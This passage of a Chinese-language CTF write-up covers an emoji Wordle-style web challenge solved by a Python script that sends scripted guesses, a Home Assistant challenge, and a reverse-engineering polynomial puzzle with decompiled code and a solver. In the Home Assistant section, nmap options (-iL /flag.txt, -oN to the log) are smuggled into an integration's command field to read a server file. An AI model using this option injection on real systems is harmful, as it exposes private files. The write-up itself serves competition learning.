<span><span style="color: #403F53">emojis </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;&quot;</span><span style="color: #403F53">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #4876D6">set</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">))</span></span>
<span></span>
<span><span style="color: #403F53">cookies </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #BC5454">None</span></span>
<span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">guess</span><span style="color: #111111">(</span><span style="color: #0C969B">g</span><span style="color: #403F53">: </span><span style="color: #4876D6">str</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">global</span><span style="color: #403F53"> cookies</span></span>
<span><span style="color: #403F53">    res </span><span style="color: #994CC3">=</span><span style="color: #403F53"> requests.</span><span style="color: #0C969B">get</span><span style="color: #403F53">(</span><span style="color: #4876D6">url</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">params</span><span style="color: #994CC3">=</span><span style="color: #4876D6">{</span><span style="color: #111111">&quot;</span><span style="color: #C96765">guess</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: g}</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">cookies</span><span style="color: #994CC3">=</span><span style="color: #4876D6">cookies</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> cookies </span><span style="color: #994CC3">is</span><span style="color: #403F53"> </span><span style="color: #BC5454">None</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        cookies </span><span style="color: #994CC3">=</span><span style="color: #403F53"> res.cookies</span></span>
<span><span style="color: #403F53">    m </span><span style="color: #994CC3">=</span><span style="color: #403F53"> re.</span><span style="color: #0C969B">findall</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">results</span><span style="color: #AA0982">\\</span><span style="color: #C96765">.push</span><span style="color: #AA0982">\\</span><span style="color: #C96765">(&quot;([🟥🟨🟩]*)&quot;</span><span style="color: #AA0982">\\</span><span style="color: #C96765">)</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> res.text</span><span style="color: #403F53">)</span><span style="color: #111111">[</span><span style="color: #AA0982">0</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">    result </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> c </span><span style="color: #994CC3">in</span><span style="color: #403F53"> m:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> c </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">🟥</span><span style="color: #111111">&quot;</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">r</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">elif</span><span style="color: #403F53"> c </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">🟨</span><span style="color: #111111">&quot;</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">y</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            result.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">g</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> result.</span><span style="color: #0C969B">count</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">g</span><span style="color: #111111">&#39;</span><span style="color: #403F53">) </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">res.text</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">return</span><span style="color: #403F53"> result</span></span>
<span></span>
<span></span>
<span><span style="color: #403F53">answer </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[</span><span style="color: #111111">&quot;</span><span style="color: #C96765">?</span><span style="color: #111111">&quot;</span><span style="color: #111111">]</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">64</span></span>
<span><span style="color: #403F53">charset </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">set</span><span style="color: #403F53">()</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">0</span><span style="color: #111111">,</span><span style="color: #4876D6"> len</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    res </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">guess</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">[</span><span style="color: #4876D6">i : i </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">])</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> j </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">64</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> j </span><span style="color: #994CC3">&gt;=</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">break</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> res[j] </span><span style="color: #994CC3">!=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">r</span><span style="color: #111111">&quot;</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            charset.</span><span style="color: #0C969B">add</span><span style="color: #403F53">(</span><span style="color: #4876D6">emojis</span><span style="color: #403F53">[</span><span style="color: #4876D6">i </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> j</span><span style="color: #403F53">])</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> e </span><span style="color: #994CC3">in</span><span style="color: #403F53"> charset:</span></span>
<span><span style="color: #403F53">    res </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">guess</span><span style="color: #403F53">(</span><span style="color: #4876D6">e </span><span style="color: #994CC3">*</span><span style="color: #4876D6"> </span><span style="color: #AA0982">64</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> j </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">64</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> res[j] </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">g</span><span style="color: #111111">&quot;</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            answer[j] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> e</span></span>
<span></span>
<span><span style="color: #0C969B">guess</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;&quot;</span><span style="color: #4876D6">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #4876D6">answer</span><span style="color: #403F53">))</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/emodle-flag3.6be1ff45.webp"><img srcset="/assets/emodle-flag3.ddefe54a.png" loading="lazy" src="/assets/emodle-flag3.ddefe54a.png" width="755" height="532" alt="flag3"></picture></p>
<h3 id="逝界计划" class="heading"><a href="#逝界计划" class="heading-anchor" aria-label="章节： 逝界计划" tabindex="-1"></a><span>逝界计划</span></h3>
<p>添加 nmap tracker integration<span class="mojikumi-line-end">，</span>设置其命令选项<span class="mojikumi-line-end">，</span>使用 <code>-iL /flag.txt</code> 可以读取到 flag<span class="mojikumi-line-end">，</span>使用 <code>-<wbr>oN<wbr> /<wbr>config<wbr>/<wbr>home<wbr>-<wbr>assistant<wbr>.<wbr>log</code> 可以将运行结果显示在 log 中<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/hass-flag.dfd628c6.webp"><img srcset="/assets/hass-flag.f0b380f7.png" loading="lazy" src="/assets/hass-flag.f0b380f7.png" width="811" height="180" alt="flag"></picture></p>
<h2 id="reverse" class="heading"><a href="#reverse" class="heading-anchor" aria-label="章节： Reverse" tabindex="-1"></a><span>Reverse</span></h2>
<h3 id="绝妙的多项式" class="heading"><a href="#绝妙的多项式" class="heading-anchor" aria-label="章节： 绝妙的多项式" tabindex="-1"></a><span>绝妙的多项式</span></h3>
<h4 id="level-1-13" class="heading"><a href="#level-1-13" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>反编译得到核心代码如下<span class="mojikumi-line-end">，</span>其中 <code>mint</code> 是模 998244353 的计算<span class="mojikumi-line-end">，</span>即算出来的是<span class="mojikumi-line-start">“</span>将输入字符串视作 1~len 进制数<span class="mojikumi-line-end">”</span>模 998244353 的值<span class="mojikumi-line-end">，</span>然后解方程即可<span class="mojikumi">。</span><wbr><span class="mojikumi-line-start">（</span>当然也可以 Lagrange 插值<span class="mojikumi">。</span><span class="mojikumi-line-end">）</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C++ 代码块" data-v-ad49d235>C++</h5><ile-root id="ile-26"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-26--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;=</span><span style="color: #D6DEEB"> flagLength; i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    sum </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    exp </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (j </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; j </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> flagLength; j </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        x </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (mint)mint::operator</span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)j </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)poly), exp);</span></span>
<span><span style="color: #D6DEEB">        mint::operator</span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">sum, x);</span></span>
<span><span style="color: #D6DEEB">        mint::</span><span style="color: #82AAFF">mint</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">i_m, i);</span></span>
<span><span style="color: #D6DEEB">        mint::operator</span><span style="color: #C792EA">*=</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">exp, i_m);</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (sum </span><span style="color: #C792EA">!=</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">DAT_00105020)[i </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">])</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        pbVar1 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> std::operator</span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB">((basic_ostream </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)std::cout, </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">Failed, please try again!</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">        std::basic_ostream&lt;&gt;::operator</span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB">((basic_ostream</span><span style="color: #C792EA">&lt;&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)pbVar1, std::endl</span><span style="color: #C792EA">&lt;&gt;</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">        uVar3 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">goto</span><span style="color: #D6DEEB"> LAB_00101a65;</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">for</span><span style="color: #403F53"> (i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">; i </span><span style="color: #994CC3">&lt;=</span><span style="color: #403F53"> flagLength; i </span><span style="color: #994CC3">=</span><span style="color: #403F53"> i </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    sum </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    exp </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> (j </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">; j </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> flagLength; j </span><span style="color: #994CC3">=</span><span style="color: #403F53"> j </span><span style="color: #994CC3">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        x </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (mint)mint::operator</span><span style="color: #994CC3">*</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)j </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53"> </span><span style="color: #994CC3">+</span><span style="color: #403F53"> (</span><span style="color: #994CC3">long</span><span style="color: #403F53">)poly), exp);</span></span>
<span><span style="color: #403F53">        mint::operator</span><span style="color: #994CC3">+=</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">sum, x);</span></span>
<span><span style="color: #403F53">        mint::</span><span style="color: #4876D6">mint</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">i_m, i);</span></span>
<span><span style="color: #403F53">        mint::operator</span><span style="color: #994CC3">*=</span><span style="color: #403F53">((mint </span><span style="color: #994CC3">*</span><span style="color: #403F53">)</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">exp, i_m);</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (sum </span><span style="color: #994CC3">!=</span><span style="color: #403F53"> (</span><span style="color: #994CC3">&amp;</span><span style="color: #403F53">DAT_00105020)[i </span><span style="color: #994CC3">-</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">])</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        pbVar1 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> std::operator</span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53">((basic_ostream </span><span style="color: #994CC3">*</span><span style="color: #403F53">)std::cout, </span><span style="color: #111111">&quot;</span><span style="color: #C96765">Failed, please try again!</span><span style="color: #111111">&quot;</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">        std::basic_ostream&lt;&gt;::operator</span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53">((basic_ostream</span><span style="color: #994CC3">&lt;&gt;</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53">)pbVar1, std::endl</span><span style="color: #994CC3">&lt;&gt;</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">        uVar3 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">goto</span><span style="color: #403F53"> LAB_00101a65;</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-27"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-27--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">mod </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">998244353</span></span>
<span></span>
<span><span style="color: #D6DEEB">c </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">00000CB0</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">168C83AC</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">0D1D79D4</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">0228A0DD</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">00E57451</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">25F3BF43</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">0F1653F7</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">395B969F</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">37198928</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">1651D179</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">20F1DF11</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">38F4DC2B</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">37CDD474</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2043323C</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">0E4CB532</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">14FE0ADA</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2DADCE9D</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2C325FFB</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">00D9357C</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">1C90D4E6</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">19A7E972</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">24EAABA9</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2C2A70ED</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">315995C6</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">1E48BE27</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">099C05B0</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">0EE775B0</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">27F52AA6</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">136F26DB</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">05CE66CF</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">37F9958D</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2D634F37</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">0F424CE3</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2348C868</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">0A16629F</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2ACC2B38</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">0F7FEB61</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">159215F5</span><span style="color: #D6DEEB">,</span></span>
<span><span style="color: #D9F5DD">]</span></span>
<span></span>
<span><span style="color: #D6DEEB">n </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">c</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #D6DEEB">a </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">n</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    a.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">[</span><span style="color: #C5E478">pow</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">1</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> j</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> mod</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">for</span><span style="color: #82AAFF"> j </span><span style="color: #C792EA">in</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">n</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">]</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #D9F5DD">[</span><span style="color: #82AAFF">c</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">n</span><span style="color: #D6DEEB">):</span></span>
